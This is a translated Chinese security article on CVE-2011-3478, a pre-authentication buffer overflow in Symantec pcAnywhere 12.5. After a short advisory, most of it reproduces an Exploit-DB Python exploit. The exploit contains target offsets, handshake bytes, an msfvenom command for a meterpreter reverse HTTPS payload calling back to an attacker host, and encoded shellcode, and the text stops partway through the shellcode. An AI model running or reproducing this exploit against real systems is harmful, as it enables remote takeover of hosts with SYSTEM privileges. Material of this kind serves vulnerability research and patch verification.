# Windows x86平台上的Symantec pcAnywhere 12.5.0远程代码执行漏洞
|
##### 译文声明
本文是翻译文章，文章来源：360安全播报
译文仅供参考，具体内容表达以及含义原文为准。
影响版本:  
pcAnywhere v12.5.x 到 12.5.3  
Symantec IT Management Suite pcAnywhere Solution 7.0 (aka 12.5.x) and 7.1 (aka
12.6.x)  
影响平台:
windows x86  
# – Windows 2000  
# – Windows 2003 Server  
# – Windows 2008 Server  
# – Windows XP  
# – Windows Vista  
# – Windows 7  
漏洞描述:  
awhost32.exe在处理连接进来的请求时,存在一个漏洞,当处理认证请求时,没有对客户的输入进行长度检查,导致远程非认证的攻击者能够利用此漏洞执行任意代码,默认权限是"NT
AUTHORITYSYSTEM"  
限制：
1、只能X86平台
2、要求能输入帐号密码
3、无须认证码
POC代码:  
[https://www.exploit-db.com/exploits/38599/](https://www.exploit-db.com/exploits/38599/)
    #!/usr/bin/python
    ################################################################
    # Exploit Title: Symantec pcAnywhere v12.5.0 Windows x86 RCE
    # Date: 2015-10-31
    # Exploit Author: Tomislav Paskalev
    # Vendor Homepage: https://www.symantec.com/
    # Software Link: http://esdownload.symantec.com/akdlm/CD/MTV/pcAnywhere_12_5_MarketingTrialware.exe
    #   Version: Symantec pcAnywhere v12.5.0 Build 442 (Trial)
    # Vulnerable Software:
    #   Symantec pcAnywhere 12.5.x through 12.5.3
    #   Symantec IT Management Suite pcAnywhere Solution 7.0 (aka 12.5.x) and 7.1 (aka 12.6.x)
    # Tested on:
    #   Symantec pcAnywhere v12.5.0 Build 442 (Trial)
    #   --------------------------------------------    #   Microsoft Windows Vista Ultimate SP1 x86 EN
    #   Microsoft Windows Vista Ultimate SP2 x86 EN
    #   Microsoft Windows 2008 Enterprise SP2 x86 EN
    #   Microsoft Windows 7 Professional SP1 x86 EN
    #   Microsoft Windows 7 Ultimate SP1 x86 EN
    # CVE ID: 2011-3478
    # OSVDB-ID: 78532
    ################################################################
    # Vulnerability description:
    #   The application's module used for handling incoming connections
    #   (awhost32.exe) contains a flaw. When handling authentication
    #   requests, the vulnerable process copies user provided input
    #   to a fixed length buffer without performing a length check.
    #   A remote unauthenticated attacker can exploit this vulnerability
    #   to cause a buffer overflow and execute arbitrary code in the
    #   context of the exploited application (installed as a service
    #   by default, i.e. with "NT AUTHORITYSYSTEM" privileges).
    ################################################################
    # Target application notes:
    #   - the application processes one login attempt at a time
    #     (i.e. multiple parallel login requests are not possible)
    #   - available modules (interesting exploit wise):
    #     Name         | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll
    #    -------------------------------------------------------------    #     awhost32.exe | False  | False   | False |  False   | False
    #     ijl20.dll    | False  | False   | False |  False   | False
    #     IMPLODE.DLL  | False  | False   | False |  False   | False
    #    -------------------------------------------------------------    #   - supported Windows x86 operating systems (pcAnywhere v12.5)
    #       - Windows 2000
    #       - Windows 2003 Server
    #       - Windows 2008 Server
    #       - Windows XP
    #       - Windows Vista
    #       - Windows 7
    ################################################################
    # Exploit notes:
    #   - bad characters: "x00"
    #   - Windows Vista, Windows 2008 Server, Windows 7
    #     - after a shellcode execution event occurs, the
    #       application does not crash and remains fully functional
    #       - one successful shellcode execution event has a low
    #         success rate (applies to all OSes)
    #         - in order to achieve an overall more reliable exploit,
    #           multiple shellcode executions need to be performed
    #           (until the shellcode is successfully executed)
    #           - brute force is a feasible method 
    #             - multiple parallel brute force attacks are not possible
    #   - multiple valid offsets are available (i.e. not just the
    #     ones tested)
    ################################################################
    # Test notes:
    #   - all tested OSes
    #     - clean default installations
    #   - all OS specific statistics referenced in the exploit are
    #     based on the test results of 10 attempts per tested offset
    #     - all attempts were performed after a system reboot (VM)
    #     - the provided test results should be taken only as a rough guide
    #       - in practice it might occur that the number of attempts
    #         needed to achieve successful exploitation is (much)
    #         higher than the maximum value contained in the test
    #         results, or that the exploit does not succeed at all
    #         - other (untested) offsets might provide better results
    #   - not letting the OS and application load fully/properly before
    #     starting the exploit may lead to failed exploitation (this
    #     observation was made during the testing of the exploit and
    #     applies mostly to Windows 7)
    ################################################################
    # Patch:
    #   https://support.symantec.com/en_US/article.TECH179526.html
    #   https://support.norton.com/sp/en/us/home/current/solutions/v78694006_EndUserProfile_en_us
    ################################################################
    # Thanks to:
    #   Tal zeltzer (discovered the vulnerability)
    #   S2 Crew (Python PoC)
    ################################################################
    # In memoriam:
    #   msfpayload | msfencode  [2005 - 2015]
    ################################################################
    # References:
    #   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3478
    #   http://www.zerodayinitiative.com/advisories/ZDI-12-018/
    #   https://www.exploit-db.com/exploits/19407/
    ################################################################
    import socket
    import time
    import struct
    import string
    import sys
    ################################
    ###  HARDCODED TARGET INFO   ###
    ################################
    # target server info
    # >>> MODIFY THIS >>>
    targetServer = "192.168.80.227"
    targetPort   = 5631
    # Supported operating systems
    vistaUltSP1  = {
        'Version': 'Microsoft Windows Vista Ultimate SP1 x86 EN',
        'Offset': 0x03e60000,
        'PasswordStringLength': 3500,
        'TestAttempts': [8, 62, 35, 13, 8, 7, 11, 23, 8, 10]
    };
    vistaUltSP2  = {
        'Version': 'Microsoft Windows Vista Ultimate SP2 x86 EN',
        'Offset': 0x03e60000,
        'PasswordStringLength': 3500,
        'TestAttempts': [16, 27, 13, 17, 4, 13, 7, 9, 5, 16]
    };
    s2k8EntSP2   = {
        'Version': 'Microsoft Windows 2008 Enterprise SP2 x86 EN',
        'Offset': 0x03dd0000,
        'PasswordStringLength': 3500,
        'TestAttempts': [25, 5, 14, 18, 66, 7, 8, 4, 4, 24]
    };
    sevenProSP1  = {
        'Version': 'Microsoft Windows 7 Professional SP1 x86 EN',
        'Offset': 0x03a70000,
        'PasswordStringLength': 3500,
        'TestAttempts': [188, 65, 25, 191, 268, 61, 127, 136, 18, 98]
    };
    sevenUltSP1  = {
        'Version': 'Microsoft Windows 7 Ultimate SP1 x86 EN',
        'Offset': 0x03fa0000,
        'PasswordStringLength': 3500,
        'TestAttempts': [23, 49, 98, 28, 4, 31, 4, 42, 50, 42]
    };
    # target server OS
    # >>> MODIFY THIS >>>
    #OSdictionary = vistaUltSP1
    #OSdictionary = vistaUltSP2
    #OSdictionary = s2k8EntSP2
    #OSdictionary = sevenProSP1
    OSdictionary = sevenUltSP1
    # timeout values
    shellcodeExecutionTimeout = 30
    # client-server handshake
    initialisationSequence = "x00x00x00x00"
    handshakeSequence      = "x0dx06xfe"
    # username string
    usernameString         = "U" * 175
    # shellcode
    # available shellcode space: 1289 bytes
    # shellcode generated with Metasploit Framework Version: 4.11.4-2015090201 (Kali 2.0)
    # msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=192.168.80.223 LPORT=443 EXITFUNC=seh -e x86/shikata_ga_nai -b 'x00' -f python -v shellcode
    # >>> MODIFY THIS >>>
    shellcode =  ""
    shellcode += "xdaxd3xd9x74x24xf4xbfx2cx46x39x97x5d"
    shellcode += "x33xc9xb1x87x83xedxfcx31x7dx14x03x7d"
    shellcode += "x38xa4xccx6bxa8xaax2fx94x28xcbxa6x71"
    shellcode += "x19xcbxddxf2x09xfbx96x57xa5x70xfax43"
    shellcode += "x3exf4xd3x64xf7xb3x05x4ax08xefx76xcd"
    shellcode += "x8axf2xaax2dxb3x3cxbfx2cxf4x21x32x7c"
    shellcode += "xadx2exe1x91xdax7bx3ax19x90x6ax3axfe"
    shellcode += "x60x8cx6bx51xfbxd7xabx53x28x6cxe2x4b"
    shellcode += "x2dx49xbcxe0x85x25x3fx21xd4xc6xecx0c"
    shellcode += "xd9x34xecx49xddxa6x9bxa3x1ex5ax9cx77"
    shellcode += "x5dx80x29x6cxc5x43x89x48xf4x80x4cx1a"
    shellcode += "xfax6dx1ax44x1ex73xcfxfex1axf8xeexd0"
    shellcode += "xabxbaxd4xf4xf0x19x74xacx5cxcfx89xae"
    shellcode += "x3fxb0x2fxa4xadxa5x5dxe7xb9x57x3bx6c"